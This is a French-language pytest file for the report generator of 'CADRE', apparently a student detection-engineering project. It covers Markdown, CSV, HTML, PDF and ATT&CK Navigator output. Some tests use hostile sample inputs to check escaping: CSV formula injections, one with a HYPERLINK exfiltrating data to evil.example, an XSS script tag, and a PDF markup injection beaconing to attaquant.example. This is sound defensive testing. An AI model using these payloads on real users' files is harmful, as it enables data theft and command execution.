"""
Tests pour le système de rapport.

Ces tests vérifient la génération des rapports Markdown et CSV.
"""

import json
from datetime import datetime

from cadre.rapport import (
    _defuse_formule_csv,
    _grouper_par_statut,
    generer_csv,
    generer_layer_navigator,
    generer_rapport_cycle,
    generer_rapport_html,
    generer_rapport_pdf,
    generer_rapport_soutenance,
)

# Données de test
RESULTATS_TEST = [
    {
        "timestamp": "2026-07-16T20:30:00",
        "id": "CADRE-EXE-001",
        "nom": "PowerShell Discovery",
        "technique_mitre": "T1059.001",
        "tactique": "Execution",
        "description": "Émulation PowerShell",
        "event_ids_attendus": ["4104", "4688"],
        "statut": "VALIDE",
        "raison": "Règle générée, validée et déployée",
        "nb_tp": 1,
        "nb_fp": 3,
    },
    {
        "timestamp": "2026-07-16T20:31:00",
        "id": "CADRE-PER-001",
        "nom": "Création de compte",
        "technique_mitre": "T1136.001",
        "tactique": "Persistence",
        "description": "Création d'utilisateur",
        "event_ids_attendus": ["4720", "4726"],
        "statut": "ANGLE_MORT",
        "raison": "Aucun log collecté",
        "nb_tp": 0,
        "nb_fp": 0,
    },
    {
        "timestamp": "2026-07-16T20:32:00",
        "id": "CADRE-DIS-001",
        "nom": "Énumération utilisateurs",
        "technique_mitre": "T1087.001",
        "tactique": "Discovery",
        "description": "net user",
        "event_ids_attendus": ["4661"],
        "statut": "REJETE",
        "raison": "Trop de faux positifs",
        "nb_tp": 5,
        "nb_fp": 120,
    },
]


RESULTATS_AVEC_NON_APPLICABLE = [
    *RESULTATS_TEST,
    {
        "timestamp": "2026-07-16T20:33:00",
        "id": "CADRE-LIN-001",
        "nom": "Bash Reverse Shell Test (safe)",
        "technique_mitre": "T1059.004",
        "tactique": "Execution",
        "description": "Test Linux",
        "event_ids_attendus": ["100"],
        "statut": "NON_APPLICABLE",
        "raison": "Attaque linux, cible configurée windows — non exécutée",
        "nb_tp": None,
        "nb_fp": None,
    },
]


class TestRapportCycle:
    """Tests de génération de rapport Markdown."""

    def test_rapport_contient_header(self, tmp_path):
        chemin = tmp_path / "rapport.md"
        generer_rapport_cycle(RESULTATS_TEST, chemin)
        contenu = chemin.read_text(encoding="utf-8")
        # Le rapport réel commence par "# Rapport de cycle d'audit CADRE"
        assert "Rapport" in contenu and "CADRE" in contenu
        assert datetime.now().strftime("%Y") in contenu

    def test_rapport_contient_statistiques(self, tmp_path):
        chemin = tmp_path / "rapport.md"
        generer_rapport_cycle(RESULTATS_TEST, chemin)
        contenu = chemin.read_text(encoding="utf-8")
        assert "Résumé exécutif" in contenu
        assert "validées et déployées" in contenu.lower()
        # Chaque statut a sa propre section, groupée plutôt qu'un tableau plat
        assert "Règles validées et déployées" in contenu
        assert "Angles morts" in contenu
        assert "Règles rejetées" in contenu

    def test_rapport_contient_resultats(self, tmp_path):
        chemin = tmp_path / "rapport.md"
        generer_rapport_cycle(RESULTATS_TEST, chemin)
        contenu = chemin.read_text(encoding="utf-8")
        # Les techniques MITRE apparaissent dans le tableau récapitulatif
        assert "T1059.001" in contenu
        assert "T1136.001" in contenu
        assert "T1087.001" in contenu

    def test_rapport_contient_la_section_valeur_metier(self, tmp_path):
        chemin = tmp_path / "rapport.md"
        generer_rapport_cycle(RESULTATS_TEST, chemin)
        contenu = chemin.read_text(encoding="utf-8")
        assert "Valeur métier" in contenu
        assert "Temps d'ingénierie estimé économisé" in contenu
        assert "hypothèse" in contenu.lower()  # honnêteté : l'estimation est signalée

    def test_rapport_sans_synthese_ia_par_defaut(self, tmp_path):
        chemin = tmp_path / "rapport.md"
        generer_rapport_cycle(RESULTATS_TEST, chemin)
        contenu = chemin.read_text(encoding="utf-8")
        assert "Synthèse IA" not in contenu

    def test_rapport_avec_synthese_ia(self, tmp_path):
        chemin = tmp_path / "rapport.md"
        generer_rapport_cycle(
            RESULTATS_TEST,
            chemin,
            resume_llm="Résumé exécutif factice.",
            analyse_llm="Vérifiez Sysmon sur T1136.001.",
        )
        contenu = chemin.read_text(encoding="utf-8")
        assert "Synthèse IA" in contenu
        assert "Résumé exécutif factice." in contenu
        assert "Vérifiez Sysmon sur T1136.001." in contenu

    def test_rapport_avec_explication_rejets(self, tmp_path):
        """B4 : symétrique au test des angles morts, pour les rejets."""
        chemin = tmp_path / "rapport.md"
        generer_rapport_cycle(
            RESULTATS_TEST,
            chemin,
            explication_rejets="Ajoutez un filtre sur le processus parent.",
        )
        contenu = chemin.read_text(encoding="utf-8")
        assert "Synthèse IA" in contenu
        assert "règles rejetées" in contenu
        assert "Ajoutez un filtre sur le processus parent." in contenu

    def test_rapport_pas_de_secret(self, tmp_path):
        """Aucun secret ne doit apparaître dans le rapport."""
        resultats_avec_secret = [
            {
                **RESULTATS_TEST[0],
                "stdout": "Connection avec P@ssw0rd123 réussie",
            }
        ]
        chemin = tmp_path / "rapport.md"
        generer_rapport_cycle(resultats_avec_secret, chemin)
        contenu = chemin.read_text(encoding="utf-8")
        # Le stdout complet n'est pas censé apparaître dans le rapport
        # (seulement les champs autorisés)
        assert "P@ssw0rd123" not in contenu

    def test_brouillon_ia_affiche_a_cote_de_la_regle_deterministe(self, tmp_path):
        resultats = [
            {
                **RESULTATS_TEST[0],
                "regle_sigma_yaml": "title: Règle déterministe\n",
                "regle_sigma_ia_brouillon": "title: Brouillon IA\n",
            }
        ]
        chemin = tmp_path / "rapport.md"
        generer_rapport_cycle(resultats, chemin)
        contenu = chemin.read_text(encoding="utf-8")
        assert "Règle déterministe" in contenu
        assert "Brouillon IA" in contenu
        assert "non validé, non déployé" in contenu.lower()

    def test_pas_de_section_brouillon_ia_si_absent(self, tmp_path):
        resultats = [{**RESULTATS_TEST[0], "regle_sigma_yaml": "title: Règle déterministe\n"}]
        chemin = tmp_path / "rapport.md"
        generer_rapport_cycle(resultats, chemin)
        contenu = chemin.read_text(encoding="utf-8")
        assert "Brouillon IA comparatif" not in contenu

    def test_non_applicable_exclu_du_taux_de_reussite(self, tmp_path):
        """Une attaque NON_APPLICABLE (plateforme incompatible) ne doit
        pas pénaliser le taux de réussite calculé sur les 3 autres
        attaques réellement applicables (1 validée / 3 = 33.3%)."""
        chemin = tmp_path / "rapport.md"
        generer_rapport_cycle(RESULTATS_AVEC_NON_APPLICABLE, chemin)
        contenu = chemin.read_text(encoding="utf-8")
        assert "Non applicables" in contenu
        assert "1/3 = 33.3%" in contenu
        assert "T1059.004" in contenu  # la technique NON_APPLICABLE est bien listée

    def test_simule_compte_comme_succes_dans_le_taux(self, tmp_path):
        """Régression : SIMULE (mode --simulate) était absent de
        _ORDRE_STATUTS -- un cycle 100% simulé avec succès affichait
        0% de réussite au lieu de 100%. Même définition du succès que
        scenarios.STATUTS_DETECTES (VALIDE/VALIDE_NON_DEPLOYE/SIMULE)."""
        resultats = [
            {**RESULTATS_TEST[0], "statut": "SIMULE"},
            {**RESULTATS_TEST[1], "statut": "SIMULE"},
        ]
        chemin = tmp_path / "rapport.md"
        generer_rapport_cycle(resultats, chemin)
        contenu = chemin.read_text(encoding="utf-8")
        assert "Attaques simulées" in contenu
        assert "2/2 = 100.0%" in contenu

    def test_en_attente_revue_compte_comme_succes_et_apparait(self, tmp_path):
        """Régression (audit) : EN_ATTENTE_REVUE (cadre cycle --revue) était
        absent de _ORDRE_STATUTS -- une règle validée TP/FP mais en attente
        de revue humaine disparaissait silencieusement du rapport (résumé
        exécutif, section "Résultats par statut"), et le taux de réussite
        ne comptait ni ne mentionnait ces attaques."""
        resultats = [
            {**RESULTATS_TEST[0], "statut": "EN_ATTENTE_REVUE"},
            {**RESULTATS_TEST[1], "statut": "EN_ATTENTE_REVUE"},
        ]
        chemin = tmp_path / "rapport.md"
        generer_rapport_cycle(resultats, chemin)
        contenu = chemin.read_text(encoding="utf-8")
        assert "en attente de revue humaine" in contenu
        assert "2/2 = 100.0%" in contenu
        assert "T1059.001" in contenu
        assert "T1136.001" in contenu


class TestRapportCSV:
    """Tests de génération de CSV."""

    def test_csv_genere(self, tmp_path):
        chemin = tmp_path / "resultats.csv"
        generer_csv(RESULTATS_TEST, chemin)
        assert chemin.exists()
        contenu = chemin.read_text(encoding="utf-8")
        # Le CSV réel a comme colonnes "timestamp,technique_mitre,tactique,..."
        assert "technique_mitre" in contenu
        assert "T1059.001" in contenu
        assert "T1136.001" in contenu

    def test_csv_format_valide(self, tmp_path):
        """Le CSV doit être parsable par le module csv standard."""
        import csv as csv_module

        chemin = tmp_path / "resultats.csv"
        generer_csv(RESULTATS_TEST, chemin)

        with open(chemin, encoding="utf-8") as f:
            reader = csv_module.DictReader(f)
            rows = list(reader)

        assert len(rows) == 3
        # Les colonnes réelles sont timestamp,technique_mitre,tactique,...
        assert rows[0]["technique_mitre"] == "T1059.001"
        assert rows[1]["statut"] == "ANGLE_MORT"
        assert rows[2]["statut"] == "REJETE"

    def test_defuse_formule_csv_prefixe_les_caracteres_dangereux(self):
        """Régression sécurité (audit) : CWE-1236 -- une cellule commençant
        par =/+/-/@ (ou tabulation/retour chariot) est interprétée comme une
        formule par Excel/LibreOffice à l'ouverture (ex. HYPERLINK
        exfiltrant des données, DDE sur d'anciennes versions d'Excel)."""
        for dangereux in (
            "=cmd|'/c calc'!A1",
            "+1+1",
            "-2+3",
            "@SUM(A1:A9)",
            "\tformule",
            "\rformule",
        ):
            assert _defuse_formule_csv(dangereux) == "'" + dangereux

    def test_defuse_formule_csv_laisse_les_valeurs_normales_intactes(self):
        assert _defuse_formule_csv("PowerShell Discovery") == "PowerShell Discovery"
        assert _defuse_formule_csv("T1059.001") == "T1059.001"
        assert _defuse_formule_csv(3) == 3
        assert _defuse_formule_csv(None) is None

    def test_csv_neutralise_une_description_malveillante(self, tmp_path):
        """Reproduction bout-en-bout : une `description` d'attaque perso
        (source non fiable -- brouillon LLM ou catalogue_utilisateur.py)
        contenant une formule ne doit jamais atteindre le fichier CSV telle
        quelle."""
        resultats = [
            {
                **RESULTATS_TEST[0],
                "description": '=HYPERLINK("http://evil.example/steal?"&A1,"Cliquez ici")',
            }
        ]
        chemin = tmp_path / "resultats.csv"
        generer_csv(resultats, chemin)
        contenu = chemin.read_text(encoding="utf-8")
        assert "'=HYPERLINK" in contenu
        assert "\n=HYPERLINK" not in contenu
        assert ",=HYPERLINK" not in contenu


class TestDonutSvg:
    def test_cycle_vide_affiche_zero_pas_un(self):
        """Régression : `total = sum(...) or 1` affichait "1 attaque" sur
        un cycle à 0 résultat -- le `or 1` n'évitait aucune division par
        zéro (la boucle de tracé ne s'exécute jamais si `segments` est
        vide), il ne faisait que fausser le chiffre affiché."""
        from cadre.rapport import _donut_svg

        svg = _donut_svg(_grouper_par_statut([]))
        assert ">0<" in svg
        assert ">1<" not in svg


class TestRapportHTML:
    """Tests du rapport HTML autonome."""

    def test_html_genere_et_bien_forme(self, tmp_path):
        chemin = tmp_path / "rapport.html"
        generer_rapport_html(RESULTATS_TEST, chemin)
        contenu = chemin.read_text(encoding="utf-8")
        assert contenu.startswith("<!doctype html>")
        assert "</html>" in contenu

    def test_html_contient_les_techniques(self, tmp_path):
        chemin = tmp_path / "rapport.html"
        generer_rapport_html(RESULTATS_TEST, chemin)
        contenu = chemin.read_text(encoding="utf-8")
        assert "T1059.001" in contenu
        assert "T1136.001" in contenu
        assert "T1087.001" in contenu

    def test_html_echappe_le_contenu(self, tmp_path):
        """Un champ contenant du HTML brut ne doit pas casser la page (XSS)."""
        resultats = [{**RESULTATS_TEST[0], "raison": "<script>alert(1)</script>"}]
        chemin = tmp_path / "rapport.html"
        generer_rapport_html(resultats, chemin)
        contenu = chemin.read_text(encoding="utf-8")
        assert "<script>alert(1)</script>" not in contenu
        assert "&lt;script&gt;" in contenu


class TestRapportPDF:
    """Tests du rapport PDF natif (reportlab) -- téléchargement direct depuis
    le tableau de bord, sans passer par le rapport HTML."""

    def test_pdf_genere_un_fichier_valide(self, tmp_path):
        chemin = tmp_path / "rapport.pdf"
        resultat = generer_rapport_pdf(RESULTATS_TEST, chemin)
        assert resultat == chemin
        assert chemin.exists()
        # Signature PDF standard ("%PDF-"), premiers octets du fichier --
        # confirme un PDF structurellement valide, pas juste un fichier vide
        # ou du texte brut renommé.
        assert chemin.read_bytes()[:5] == b"%PDF-"
        assert chemin.stat().st_size > 500  # un PDF vide/cassé fait quelques octets

    def test_pdf_avec_duree_ne_leve_pas(self, tmp_path):
        chemin = tmp_path / "rapport.pdf"
        generer_rapport_pdf(RESULTATS_TEST, chemin, duree_sec=1265.0)
        assert chemin.read_bytes()[:5] == b"%PDF-"

    def test_pdf_resultats_vides_ne_leve_pas(self, tmp_path):
        """Un cycle sans résultat (ex. catalogue filtré à vide) ne doit pas
        faire planter la génération -- même garantie que les autres formats."""
        chemin = tmp_path / "rapport.pdf"
        generer_rapport_pdf([], chemin)
        assert chemin.read_bytes()[:5] == b"%PDF-"

    def test_pdf_cree_le_repertoire_parent(self, tmp_path):
        chemin = tmp_path / "sous_dossier" / "rapport.pdf"
        generer_rapport_pdf(RESULTATS_TEST, chemin)
        assert chemin.exists()

    def test_description_et_raison_sont_echappees_avant_reportlab(self, tmp_path):
        """Régression sécurité : `description`/`raison` peuvent provenir d'une
        découverte IA (LLM) ou d'un import Atomic Red Team tiers -- jamais
        filtrées par le garde-fou anti-destruction (qui ne porte que sur
        `commande`). `Paragraph()` de reportlab interprète son texte comme du
        balisage XML/HTML restreint (<b>, <font>, <a href>, <img src>...),
        jamais comme du texte brut : sans échappement, un contenu malveillant
        injecté dans ces champs serait interprété comme du balisage plutôt
        qu'affiché tel quel (ex. <img src="http://attaquant/beacon"> --
        requête sortante à l'ouverture du PDF)."""
        from reportlab.lib.styles import getSampleStyleSheet

        from cadre.rapport import _ligne_tableau_pdf

        style_normal = getSampleStyleSheet()["Normal"]
        resultat_malveillant = {
            "technique_mitre": "T1059.001",
            "description": '<img src="http://attaquant.example/beacon.png"/>',
            "tactique": "Execution",
            "nb_tp": 1,
            "nb_fp": 0,
            "raison": "<b>injecte</b>",
        }
        ligne = _ligne_tableau_pdf(resultat_malveillant, style_normal)
        # Les balises doivent apparaître ÉCHAPPÉES (texte littéral), jamais
        # sous leur forme brute interprétable par le parseur de Paragraph.
        assert "&lt;img" in ligne[0].text
        assert "<img" not in ligne[0].text
        assert "&lt;b&gt;" in ligne[4].text
        assert "<b>" not in ligne[4].text
        # Confirme aussi que le cycle complet ne plante pas avec ce contenu.
        chemin = tmp_path / "rapport_malveillant.pdf"
        generer_rapport_pdf([{**resultat_malveillant, "id": "X", "statut": "VALIDE"}], chemin)
        assert chemin.read_bytes()[:5] == b"%PDF-"


class TestLayerNavigator:
    """Tests de l'export du layer MITRE ATT&CK Navigator."""

    def test_layer_json_valide(self, tmp_path):
        chemin = tmp_path / "layer.json"
        generer_layer_navigator(RESULTATS_TEST, chemin)
        data = json.loads(chemin.read_text(encoding="utf-8"))
        assert data["domain"] == "enterprise-attack"
        assert "techniques" in data

    def test_layer_contient_une_entree_par_technique_testee(self, tmp_path):
        chemin = tmp_path / "layer.json"
        generer_layer_navigator(RESULTATS_TEST, chemin)
        data = json.loads(chemin.read_text(encoding="utf-8"))
        ids = {t["techniqueID"] for t in data["techniques"]}
        assert ids == {"T1059.001", "T1136.001", "T1087.001"}

    def test_layer_couleur_reflete_le_statut(self, tmp_path):
        chemin = tmp_path / "layer.json"
        generer_layer_navigator(RESULTATS_TEST, chemin)
        data = json.loads(chemin.read_text(encoding="utf-8"))
        par_id = {t["techniqueID"]: t for t in data["techniques"]}
        assert par_id["T1059.001"]["color"] == "#4caf50"  # VALIDE
        assert par_id["T1136.001"]["color"] == "#f44336"  # ANGLE_MORT
        assert par_id["T1087.001"]["color"] == "#ff9800"  # REJETE

    def test_layer_exclut_non_applicable(self, tmp_path):
        chemin = tmp_path / "layer.json"
        generer_layer_navigator(RESULTATS_AVEC_NON_APPLICABLE, chemin)
        data = json.loads(chemin.read_text(encoding="utf-8"))
        ids = {t["techniqueID"] for t in data["techniques"]}
        assert "T1059.004" not in ids

    def test_layer_inclut_simule(self, tmp_path):
        """Régression : SIMULE était absent de _COULEUR_PAR_STATUT --
        generer_layer_navigator l'excluait silencieusement (heatmap vide
        pour un cycle --simulate entièrement réussi)."""
        resultats = [{**RESULTATS_TEST[0], "statut": "SIMULE"}]
        chemin = tmp_path / "layer.json"
        generer_layer_navigator(resultats, chemin)
        data = json.loads(chemin.read_text(encoding="utf-8"))
        ids = {t["techniqueID"] for t in data["techniques"]}
        assert "T1059.001" in ids

    def test_layer_inclut_en_attente_revue(self, tmp_path):
        """Régression (audit) : EN_ATTENTE_REVUE était absent de
        _COULEUR_PAR_STATUT -- une technique dont la seule règle produite est
        en attente de revue humaine disparaissait silencieusement de la
        heatmap MITRE Navigator."""
        resultats = [{**RESULTATS_TEST[0], "statut": "EN_ATTENTE_REVUE"}]
        chemin = tmp_path / "layer.json"
        generer_layer_navigator(resultats, chemin)
        data = json.loads(chemin.read_text(encoding="utf-8"))
        ids = {t["techniqueID"] for t in data["techniques"]}
        assert "T1059.001" in ids

    def test_layer_garde_le_meilleur_statut_par_technique(self, tmp_path):
        """Deux attaques sur la même technique : le meilleur statut gagne."""
        resultats = [
            {**RESULTATS_TEST[2], "technique_mitre": "T1087.001", "statut": "REJETE"},
            {**RESULTATS_TEST[0], "technique_mitre": "T1087.001", "statut": "VALIDE"},
        ]
        chemin = tmp_path / "layer.json"
        generer_layer_navigator(resultats, chemin)
        data = json.loads(chemin.read_text(encoding="utf-8"))
        assert len(data["techniques"]) == 1
        assert data["techniques"][0]["color"] == "#4caf50"


class TestRapportSoutenance:
    """Tests du rapport de soutenance PFA."""

    def test_soutenance_structure(self, tmp_path):
        chemin = tmp_path / "soutenance.md"
        # L'API réelle utilise nom_etudiant (pas infos_etudiant)
        generer_rapport_soutenance(
            resultats_complets={
                "nb_cycles": 1,
                "nb_techniques": 12,
                "nb_regles": 8,
                "nb_deployees": 8,
                "nb_aveugles": 1,
            },
            fichier_sortie=chemin,
            nom_etudiant="Mohamed Amine EDDARI",
        )
        contenu = chemin.read_text(encoding="utf-8")
        assert "CADRE" in contenu
        assert "MITRE" in contenu or "ATT&CK" in contenu
        assert "mohamed amine eddari" in contenu.lower()

    def test_soutenance_inclut_contexte(self, tmp_path):
        chemin = tmp_path / "soutenance.md"
        generer_rapport_soutenance(
            resultats_complets={
                "nb_cycles": 1,
                "nb_techniques": 12,
                "nb_regles": 8,
                "nb_deployees": 8,
                "nb_aveugles": 1,
            },
            fichier_sortie=chemin,
            nom_etudiant="Test User",
        )
        contenu = chemin.read_text(encoding="utf-8")
        # Le rapport doit contenir les sections classiques d'un PFA
        assert (
            "Contexte" in contenu
            or "contexte" in contenu.lower()
            or "introduction" in contenu.lower()
        )
        assert "Architecture" in contenu or "architecture" in contenu.lower()
        assert "Conclusion" in contenu or "conclusion" in contenu.lower()
